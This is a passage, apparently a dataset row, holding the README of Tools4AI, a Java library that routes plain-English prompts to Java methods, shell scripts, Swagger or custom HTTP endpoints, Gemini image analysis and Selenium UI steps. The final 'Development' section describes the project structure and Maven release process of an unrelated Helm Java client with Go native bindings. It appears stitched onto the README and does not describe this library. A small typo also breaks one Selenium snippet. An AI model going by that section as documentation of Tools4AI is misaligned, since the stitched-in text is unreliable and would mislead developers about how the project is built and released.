      ""group"": ""Petstore API"",
      ""description"": ""This is for all the actions related to pets"",
      ""id"": ""petstore""
    } ,
    {
      ""swaggerurl"": ""https://vishalmysore-instaservice.hf.space/v3/api-docs"",
      ""baseurl"": ""https://vishalmysore-instaservice.hf.space/"",
      ""group"": ""Enterprise Support and Tickeing System"",
      ""description"": ""This action is to create tickets track bugs across the enterprise"",
      ""id"": ""InstaService""
    }      
  ]
}
```

Books related api are put in a group called Books Author Activity group, similarly Petstore API is group for all the rest calls exposed by Petstore app 
if you provide a prompt ""create a ticket for me with number 1 and issue is compture not working"" 
it will automatically create a ticket on InstaService you can view the logs here https://huggingface.co/spaces/VishalMysore/InstaService?logs=container

```
@Test
public void testHttpActionOpenAI() throws AIProcessingException, IOException {
  OpenAiActionProcessor processor = new OpenAiActionProcessor();
  String postABook = ""post a book harry poster with id 189 the publish date is 2024-03-22 and the description 
  is about harry who likes poster its around 500 pages  "";
  String result = (String)processor.processSingleAction(postABook);
  Assertions.assertNotNull(result);
  String success = TestHelperOpenAI.getInstance().sendMessage(""Look at this message - ""+result+"" -
   was it a success? - Reply in true or false only"");
  log.debug(success);
  Assertions.assertTrue(""True"".equalsIgnoreCase(success));

} 
```
This will automatically trigger HTTP post call with correct parameters 

Read the complete link on how this has been deployed [here](https://www.linkedin.com/pulse/enterprise-ai-hub-llm-agent-built-openai-java-vishal-mysore-0p7oc/?trackingId=iZoQDW3%2BTH6j0%2FkbEMUxFw%3D%3D)


## Shell Actions 

Any kind of script can be coverted into Action for function calling by configuring the script in [shell_actions.yml](src/test/resources/shell_actions.yaml)
```
groups:
  - name: Employee Actions
    description : This is actions for all the new employees
    scripts:
      - scriptName: ""test_script.cmd""
        actionName: saveEmployeeInformation
        parameters: employeeName,employeeLocation
        description: This is a command which will save employee information
		
```

Here we are creating a group called Employee Actions and adding an action called ``` saveEmployeeInformation``` into the group. The parameters it takes are ```employeeName ``` and ```employeeLocation ```
Calling and actionprocessor with these kinds of prompt will trigger this Action
``` 
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String promptText = ""A new employee joined today in Toronto. Her name is Madhuri Khanna""; 
 tra.processSingleAction(promptText);
 
```
		
As You can notice we are not passing the action explicitly , it will be predicted by the AI at runtime and triggered.


## Custom HTTP Actions

If you do not have swagger URL and would like to configure HTTP rest end points it can be done via Custom HTTP Actions by configuring them in [http_actions.json](src/test/resources/http_actions.json)


``` 
{
  ""endpoints"": [
    {
      ""actionName"": ""getUserDetails"",
      ""description"" : "" this will fetch User details from the user inventory corporate application"",
      ""url"": ""https://api.example.com/users/"",
      ""type"": ""GET"",
      ""input_object"": [
      {
        ""name"": ""userId"",
        ""type"": ""path_parameter"",
        ""description"": ""User ID""
      }
      ],

      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""User object""
      },
      ""auth_interface"": {
        ""type"": ""Bearer Token"",
        ""description"": ""Authentication token required""
      }
    },
    {
      ""actionName"": ""somethingNotVeryUseful"",
      ""url"": ""https://api.example.com/temperature"",
      ""description"" : "" this will get real time temperature from the weather api"",
      ""type"": ""GET"",
      ""input_object"":[
        {
          ""name"": ""locationId"",
          ""type"": ""query_parameter"",
          ""description"": ""Location ID""
      }
      ],
      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""Real-time temperature data""
      },
      ""auth_interface"": {
        ""type"": ""API Key"",
        ""description"": ""API key required""
      }
    }
  ]
}

```
## Image Actions
Tools4AI uses Gemini (gemini-1.0-pro-vision) to enhance AI capabilities by enabling the system to analyze images
and automatically execute relevant actions based on the visual data it processes. This development is 
particularly crucial in emergency management, where speed and accuracy of response can save lives and property.

Reference code is [here](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/ImageActionExample.java)

Detailed article on the same is avaiable [here](https://medium.com/@visrow/image-recognition-and-function-calling-with-gemini-and-java-e28b0356d3de)
```  
package org.example.image;

import com.t4a.processor.AIProcessingException;
import com.t4a.processor.GeminiImageActionProcessor;
import com.t4a.processor.GeminiV2ActionProcessor;

public class ImageActionExample {
    public static void main(String[] args) throws AIProcessingException {
        GeminiImageActionProcessor processor = new GeminiImageActionProcessor();
        String imageDisription = processor.imageToText(args[0]);
        GeminiV2ActionProcessor actionProcessor = new GeminiV2ActionProcessor();
        Object obj = actionProcessor.processSingleAction(imageDisription);
        String str  = actionProcessor.summarize(imageDisription+obj.toString());
        System.out.println(str);
    }
}
```
 <img src=""accident.png""  width=""300"" height=""300"">

If you execute the [ImageActionExample](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/ImageActionExample.java) 
with above image as source it correctly identifies that we need to call Ambulance 

``` 
The image depicts a car accident involving a blue car and a red car on a city street. The blue car has front-end damage while the red car has rear-end damage. Debris from the accident is scattered on the street and a 
police officer is present at the scene. An ambulance has been called and is seen in the background.
```

Direct Action from Visual Cues: Whether it's a surveillance image of a car accident or a live feed of a residential fire, Tools4AI can immediately recognize critical situations and initiate appropriate emergency protocols without human input.
A sample action is written and the code is available [here](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/action/EmergencyAction.java)
``` 
@Predict(actionName = ""callEmergencyServices"", description = ""This action will be called in case of emergency"", groupName = ""emergency"")
public class EmergencyAction implements JavaMethodAction {
    public String callEmergencyServices(@Prompt(describe = ""Ambulance, Fire or Police"") String typeOfEmergency) {
        return typeOfEmergency+"" has been called"";
    }
} 
```
## Automated UI Validations

Images can also be converted into Json and Pojos for UI based validations. You can use selenium with Tools4AI 
to validated your UI instead of using elements from the web page , more details [here](https://medium.com/@visrow/selenium-and-ai-ui-validations-with-ai-1799ab2f305e)  

 <img src=""auto.PNG""  width=""300"" height=""300"">

The above image can be converted into a Pojo object with help of Tools4AI

```  
WebDriverManager.chromedriver().setup();

ChromeOptions options = new ChromeOptions();
options.addArguments(""--headless"");  // Setting headless mode
ptions.addArguments(""--disable-gpu"");  // GPU hardware acceleration isn't useful in headless mode
options.addArguments(""--window-size=1920,1080"");  // Set the window size
WebDriver driver = new ChromeDriver(options);

driver.get(""https://google.com"");
// Your code to interact with the page and take screenshots
// Take screenshot and save it as file or use as bytes
TakesScreenshot ts = (TakesScreenshot) driver;
byte[] screenshotBytes = ts.getScreenshotAs(OutputType.BYTES);
GeminiImageActionProcessor imageActionProcessor = new GeminiImageActionProcessor();
imageActionProcessor.imageToText(screenshotBytes)
//File srcFile = ts.getScreenshotAs(OutputType.FILE);
//File destFile = new File(""screenshot.png"");
//FileHandler.copy(srcFile, destFile);
driver.quit();
```

The pojo it will convert to is 

``` 
import lombok.*;
@Getter
@Setter
@ToString
@NoArgsConstructor
@AllArgsConstructor
public class AutoRepairScreen {
    double fullInspectionValue;
    double tireRotationValue;
    double oilChangeValue;
    Integer phoneNumber;
    String email;
    String[] customerReviews;
}
```

Integrating Tools4AI with Selenium offers a revolutionary approach to UI validation, streamlining the testing 
process by validating UI elements in their entirety. Rather than the traditional method of scrutinizing each 
element individually, this integration enables comprehensive, automated verification of tags and elements.
It simplifies the UI Validation workflow, ensuring accuracy and efficiency in confirming the UI's adherence to design specifications  

## Selenium integration
Tools4AI's integration with Selenium introduces a flexible way to automate UI testing. Instead of traditional
Java code for Selenium scripts, Tools4AI allows you to define test scenarios in plain English, offering a more 
accessible approach to testing web applications. These English-based commands can be converted into Selenium 
code to automate web-based interactions and streamline testing.  

**Example of Selenium Test with Tools4AI**
``` 
 WebDriver driver = new ChromeDriver(options);
 SeleniumProcessor processor = new SeleniumProcessor(driver);
 processor.processWebAction(""go to website https://the-internet.herokuapp.com"");
 boolean buttonPresent =  processor.trueFalseQuery(""do you see Add/Remove Elements?"");
 if(buttonPresent) {
    processor.processWebAction(""click on Add/Remove Elements"");
    // perform other function in simple english
 } //else {
   // processor.processSingleAction(""Create Jira by taking screenshot"");
  // }
 processor.processWebAction(""go to website https://the-internet.herokuapp.com"");
 boolean isCheckboxPresent =  processor.trueFalseQuery(""do you see Checkboxes?"");
 if(isCheckboxPresent) {
   processor.processWebAction(""click on Checkboxes"");
   processor.processWebAction(""select checkbox 1"");
 }
```
In this example, the ```SeleniumProcessor``` processes commands in plain English and converts them into Selenium 
actions. This approach allows for complex interactions without manually writing Java code for each test. 
Tools4AI serves as a bridge between natural language and Selenium, making it easier to automate UI testing in
a way that is both efficient and intuitive.  

This integration offers substantial benefits for teams looking to streamline their UI validation process.
By enabling a more straightforward way to define and execute Selenium scripts, Tools4AI provides a flexible
framework for automating Selenium-based tests.  

## Spring integration

All the action processors have Spring integration as well 

``` 
SpringAnthropicProcessor springAnthropic = new SpringAnthropicProcessor(applicationContext)
```
``` 
SpringGeminiProcessor springGemini = new SpringGeminiProcessor();
```

```  
SpringOpenAIProcessor springOpenAI = new SpringOpenAIProcessor();
```

You can use this for spring injection and it works exactly as all other action processors , only difference is
that instead of creating new action beans it will reuse the beans already created by spring


look at the example here https://github.com/vishalmysore/SpringActions



## üìò JavaDocs

Look at the java docs here - https://javadoc.io/doc/io.github.vishalmysore/tools4ai/latest/index.html


## üß± Prediction Loaders

### üîë Java Prediction Loaders

All the classes implementing ```JavaMethodAction``` interfaces and having annotation ```@Predict``` are added to prediction list
```JavaMethodAction``` is integral to creating all AI-related actions, with each action implemented as a function adhering to the principles of functional programming. The function's name should be descriptive, aligning closely with the action it performs
```@Predict``` Annotation: This annotation ensures that the AIAction object is included in our prediction list. While not mandatory, it's advisable to mark all actions with @Predict for automatic execution. However, for highly customized actions like deleting records or canceling reservations, omitting this annotation might be preferable to prevent automatic execution.

```actionName``` the descriptive name of the primary function within the class. It's crucial to name this function accurately, as AI utilizes semantic mapping at runtime to correlate the function.

```
@Predict(actionName = ""whatFoodDoesThisPersonLike"", description = ""what is the food preference of this person "")
public class SimpleAction implements JavaMethodAction {

    public String whatFoodDoesThisPersonLike(String name) {
        if(""vishal"".equalsIgnoreCase(name))
            return ""Paneer Butter Masala"";
        else if (""vinod"".equalsIgnoreCase(name)) {
            return ""aloo kofta"";
        }else
            return ""something yummy"";
    }

}

```

So prompt like ```Hey Vishal is coming to my house for dinner``` will automatically trigger method ```whatFoodDoesThisPersonLike``` with ```name``` Vishal

### üñåÔ∏è Shell Prediction Loader  

The prediction loader is responsible for loading command scripts, shell scripts, Python scripts, or any other
type of script from configuration files. It utilizes the actionName field from the configuration to map to 
prompts in real-time. Here's an example configuration entry: 

```
- scriptName: ""test_script.cmd""
  actionName: saveEmployeeInformation
  parameters: employeeName,employeeLocation
  description: This is a command which will save employee information
 ```
During runtime, the prediction loader dynamically extracts parameters from the prompt. Subsequently, it invokes 
the corresponding script based on the action name. Upon execution, the script processes the parameters and 
generates a result, which is then sent back to the AI system.  Finally, the AI system formulates a response based on the received result and provides feedback accordingly.
User: ""Hey, Bahubali joined the IFC and we are so happy.""

In this prompt:

""Hey"" serves as a casual greeting.
""Bahubali"" represents the name of the new joiner, which needs to be extracted as a parameter.
""joined the IFC"" implies an action, where the specifics of the action need to be determined. ""IFC"" is the name of the organization.
""we are so happy"" provides additional context but doesn't directly affect the action to be taken.
The AI system first matches the user's intent with a list of all available actions. In this case, it selects the ""saveEmployeeInformation"" action as the best match. Then, it maps the parameters accordingly: ""Bahubali"" as the employee's name and ""IFC"" as the organization's name. This allows the AI system to accurately understand and execute the user's request.

### ‚úíÔ∏è Swagger Prediction Loader  
<img src=""restapi.png"" >

The Swagger Prediction Loader is capable of directly loading HTTP endpoints as predictions, enabling automatic
execution of commands that semantically match the endpoints with extracted parameters. The screenshot provided
is from https://fakerestapi.azurewebsites.net/index.html, included as an example. Each endpoint within this 
API is converted to an ```HttpPredictedAction``` and dynamically added to the prediction list in real-time by the 
```SwaggerPredictionLoader.``` 

This seamless integration allows for streamlined execution of commands based on the available HTTP endpoints.
**Parsing Swagger/OpenAPI Specification:** The Swagger Prediction Loader reads the Swagger/OpenAPI specification file, which describes the available endpoints, their methods (e.g., GET, POST), parameters, and other details.

**Endpoint Extraction:** The loader extracts each endpoint from the specification, along with its associated metadata such as method, path, parameters, etc.

**Action Mapping:** For each endpoint, the loader creates an HttpPredictedAction object. This action represents the corresponding HTTP operation (e.g., GET, POST) that clients can perform on the endpoint.

**Parameter Extraction:** The loader extracts parameters defined for each endpoint, such as query parameters, path parameters, headers, etc.

**Action Configuration:** The extracted parameters are configured within the HttpPredictedAction object, allowing for dynamic parameterization during execution. Parameters may be mapped to placeholders within the endpoint URL or included in the request body, headers, etc., as specified by the endpoint definition.

**Addition to Prediction List:** Finally, the HttpPredictedAction objects are added to the prediction list, making them available for automatic execution based on user prompts. Users can invoke actions by providing prompts that match the semantic intent of the mapped endpoints, and the system will execute the corresponding HTTP operation with the extracted parameters.

In essence, the Swagger Prediction Loader leverages the structure and metadata defined in the Swagger/OpenAPI
specification to dynamically create HttpPredictedAction objects, allowing for seamless integration of HTTP
endpoints into the prediction system

### ‚úçÔ∏è Http Prediction Loader

```HttpPredictionLoader``` is responsible for loading the manual http endpoint configuration which look something like this 

```{
  ""endpoints"": [
    {
      ""actionName"": ""getUserDetails"",
      ""description"" : "" this will fetch User details from the user inventory corporate application"",
      ""url"": ""https://api.example.com/users/"",
      ""type"": ""GET"",
      ""input_object"": [
      {
        ""name"": ""userId"",
        ""type"": ""path_parameter"",
        ""description"": ""User ID""
      }
      ],

      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""User object""
      },
      ""auth_interface"": {
        ""type"": ""Bearer Token"",
        ""description"": ""Authentication token required""
      }
    },
```
For the manual definition of HTTP endpoints using a configuration file like the one provided, the process involves specifying each endpoint along with its associated details such as action name, description, URL, HTTP method (type), input parameters, output object, and authentication interface. Here's how the mapping process occurs:

**Configuration File Parsing:** The application parses the configuration file to extract each endpoint definition along with its metadata.

**Endpoint Mapping:** For each endpoint defined in the configuration file, an HttpPredictedAction object is created to represent the corresponding HTTP operation.

**Action Configuration:** The metadata provided in the configuration file is used to configure the HttpPredictedAction object:

**Action Name:** Specifies the name of the action, which serves as a unique identifier.  
**Description:** Provides a brief description of what the action does or its purpose.  
**URL:** Defines the endpoint URL to which the HTTP request will be sent.  
**HTTP Method (Type):** Specifies the HTTP method (e.g., GET, POST) to be used for the request.  
**Input Parameters:** Describes the input parameters required for the HTTP request, such as path parameters, query parameters, etc.  
**Output Object:** Defines the format and structure of the response expected from the endpoint.  
**Authentication Interface:** Specifies the authentication mechanism required to access the endpoint, along with any necessary credentials.  
**Parameter Extraction:** The input parameters defined for each endpoint are extracted and configured within the HttpPredictedAction object.  

**Addition to Prediction List:** Finally, the HttpPredictedAction objects representing the manually defined endpoints are added to the prediction list, making them available for automatic execution based on user prompts.

This approach allows for flexibility in defining HTTP endpoints outside of a Swagger/OpenAPI specification, enabling the manual configuration of endpoints to suit specific application requirements.

### üñäÔ∏è Extended Prediction Loader
The ```ExtendedPredictionLoader``` offers a mechanism for creating custom prediction loaders. While Shell, HTTP, and Java Methods are supported by default, there may arise situations or use cases necessitating a custom set of actions. It's important to note the distinction between custom actions and ```ExtendedPredictedAction.``` Custom actions can be created by implementing the AIAction class, while ExtendedPredictedAction have their own loading mechanism. These actions are already present in the prediction list by default and cannot be predicted again.

To create custom implementations of ExtendedPredictionLoader, you need to annotate the loader class with ```@ActivateLoader.``` Prediction loader will then identify all classes with this annotation and call the ```getExtendedActions()``` method. This method should return the action names along with their corresponding ExtendedPredictOptions, allowing for the seamless integration of custom actions into the prediction system.

## Autonomous Agent 

### Action Script
If you have a complete script written in English , ScriptProcessor will process the script and provide consolidated results

```
 ScriptProcessor script = new ScriptProcessor();
 ScriptResult result =  script.process(""complexTest.action"");
 String resultsString = script.summarize(result)
 log.info(resultsString)

```

Sample script is here

``` 
can you reserve the flight for Vishal from Toronto to Bangalore for 3 Days on 7th december
If flight booking is successful, can you reserve the car for Vishal from Bangalore to Toronto for 10 Days on 17th december
if car booking is successful and flight cost are less than $1000 then book the sight seeing attraction called 5 star palace
if car booking is successful and flight cost are more than $1000 then book the sight seeing attraction called peanut palace
```

## Response Validation

### Hallucination

```ZeroShotHallucinationDetector``` is designed to assess the consistency of responses generated by a Large Language Model (LLM) and detect potential hallucinations. It operates by breaking down an original question into multiple granular questions, each probing different aspects or variations of the inquiry. These granular questions are then presented to the LLM separately, generating responses that are subsequently compared to the original question within its original context.

During comparison, factors such as semantic coherence, relevance, and contextual alignment are evaluated to quantify the consistency between each response and the original question. This evaluation results in a percentage score for each response, representing its level of conformity with the original query.

Finally, these individual percentage scores are aggregated to calculate a cumulative percentage. If the cumulative percentage surpasses a predefined threshold, it indicates a discrepancy or potential hallucination.

By systematically analyzing responses in this manner, the class provides a robust mechanism for assessing the reliability and coherence of LLM-generated content.

This method employs a Zero Shot approach to detect hallucination, utilizing a straightforward methodology devoid of external sources. It operates as follows:

Input: The method takes in responses generated by the Large Language Model (LLM) without relying on any additional data sources.

Granular Analysis: It breaks down the original question into multiple granular inquiries, covering diverse aspects or variations of the initial query.

Zero Shot Evaluation: Without external references, the method evaluates each response against the original question, assessing factors such as semantic coherence and contextual relevance.

Consistency Assessment: Based on the comparison, the method quantifies the consistency of each response, assigning a score indicative of its conformity with the original query.

Cumulative Evaluation: These individual scores are then aggregated to derive a cumulative assessment, providing insight into the overall coherence of the LLM-generated responses.

By employing a simple yet effective Zero Shot technique, this method offers a streamlined approach to detect potential hallucinations in LLM-generated content, contributing to the reliability and trustworthiness of AI-generated outputs.

## Development

### Project Structure

- Go:
  - `native`: contains the Go project that creates the native c bindings
- Java:
  - `helm-java`: contains the actual Helm Java client library
  - `lib`: contains the Java modules related to the native c binding libraries
    - `api`: contains the API for the native interfaces
    - `darwin-amd64`: contains the Java native access library for darwin/amd64
    - `darwin-arm64`: contains the Java native access library for darwin/arm64
    - `linux-amd64`: contains the Java native access library for linux/amd64
    - `linux-arm64`: contains the Java native access library for linux/arm64
    - `windows-amd64`: contains the Java native access library for windows/amd64

### Release Process

#### Release to Maven Central

To release a new version automatically:

```shell
make release V=X.Y.Z VS=X.Y
```
- `V`: New version to release.
- `VS`: New SNAPSHOT version for Maven.

To release a new version manually:

1. Update the version in the `pom.xml` file.
   ```shell
   mvn versions:set -DnewVersion=X.Y.Z -DgenerateBackupPoms=false
   ```
2. Commit and tag the release with the  `pom.xml` version.
   ```shell
   git add .
   git commit -m ""[RELEASE] vX.Y.Z released""
   git tag vX.Y.Z
   git push origin vX.Y.Z
   ```
3. Update the version in the `pom.xml` file to the next snapshot version.
   ```shell
   mvn versions:set -DnewVersion=X.Y-SNAPSHOT -DgenerateBackupPoms=false
   ```
4. Commit the changes with the following message:
   ```shell
   git add .
   git commit -m ""[RELEASE] v0.0.15 released, prepare for next development iteration""
   git push origin master
   ```

#### Create GitHub Release

Once the release is published to Maven Central, create a new [GitHub release](https://github.com/manusa/helm-java/releases/new) for the released tag.

### License Headers

Whenever a new file is created, the license header must be added. To add the license header to all files:

```shell
make license
```
",15,8,1,Apache-2.0,"build.yml,release.yml,snapshots.yml",70.0
